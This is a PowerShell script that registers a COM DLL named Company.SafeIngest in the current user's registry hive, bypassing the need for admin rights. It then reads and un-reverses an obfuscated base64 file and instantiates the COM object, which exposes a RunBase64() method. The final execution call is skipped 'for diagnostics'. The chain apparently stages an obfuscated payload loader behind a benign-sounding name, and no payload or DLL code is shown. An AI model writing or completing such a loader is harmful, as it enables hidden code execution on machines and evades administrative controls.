Write-Host "=== STEP 0: Paths and preparation ==="
$dllPath = (Resolve-Path ".\Company.SafeIngest.dll").Path
Write-Host "DLL path: $dllPath"

$work = Join-Path $env:TEMP "SafeIngestReg"
New-Item -ItemType Directory -Force -Path $work | Out-Null
Write-Host "Temp folder: $work"

Write-Host "`n=== STEP 1: Generate .reg file ==="
if ([Environment]::Is64BitProcess) {
    $regAsm = "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe"
    $regOut = Join-Path $work 'SafeIngest_x64.reg'
    Write-Host "Running in 64-bit process. Using RegAsm: $regAsm"
} else {
    $regAsm = "$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe"
    $regOut = Join-Path $work 'SafeIngest_x86.reg'
    Write-Host "Running in 32-bit process. Using RegAsm: $regAsm"
}

Write-Host "Executing RegAsm..."
& $regAsm $dllPath /codebase /regfile:$regOut
Write-Host "RegAsm exit code: $LASTEXITCODE"

if ($LASTEXITCODE -ne 0 -or -not (Test-Path $regOut)) {
    throw "RegAsm did not create $regOut (exit code $LASTEXITCODE)."
}
Write-Host "RegAsm successfully generated: $regOut"

Write-Host "`n=== STEP 2: Rewrite HKCR to HKCU ==="
$userReg = Join-Path $work ([IO.Path]::GetFileNameWithoutExtension($regOut) + "_user.reg")
(Get-Content $regOut -Raw) -replace 'HKEY_CLASSES_ROOT', 'HKEY_CURRENT_USER\Software\Classes' |
    Set-Content -Encoding ASCII $userReg
Write-Host "User registry file created: $userReg"

Write-Host "`n=== STEP 3: Import to HKCU ==="
$import = & reg.exe import "$userReg" 2>&1
Write-Host "Import result: $import"
Write-Host "Import exit code: $LASTEXITCODE"
if ($LASTEXITCODE -ne 0) {
    throw "Failed to import $userReg"
}
Write-Host "Registry import completed successfully."

Write-Host "`n=== STEP 4: Verify ProgID key in HKCU ==="
$progKey = 'HKCU:\Software\Classes\Company.SafeIngest'
Write-Host "Checking key: $progKey"
if (-not (Test-Path $progKey)) {
    throw "ProgID Company.SafeIngest not found in HKCU after import."
}
Write-Host "ProgID found successfully."

Write-Host "`n=== STEP 5: Read and reverse Base64 file ==="
$revBase64 = Get-Content -Raw -Path "base64.txt"
Write-Host "Base64 length: $($revBase64.Length)"
$chars = $revBase64.ToCharArray()
[Array]::Reverse($chars)
$fixedBase64 = -join $chars
Write-Host "Base64 successfully reversed (not executed)."

Write-Host "`n=== STEP 6: Create COM object ==="
try {
    $com = New-Object -ComObject Company.SafeIngest -ErrorAction Stop
    Write-Host "COM object created successfully."
    Write-Host "Skipping RunBase64() for diagnostics."
}
catch {
    Write-Error "Failed to create COM object: $($_.Exception.Message)"
}
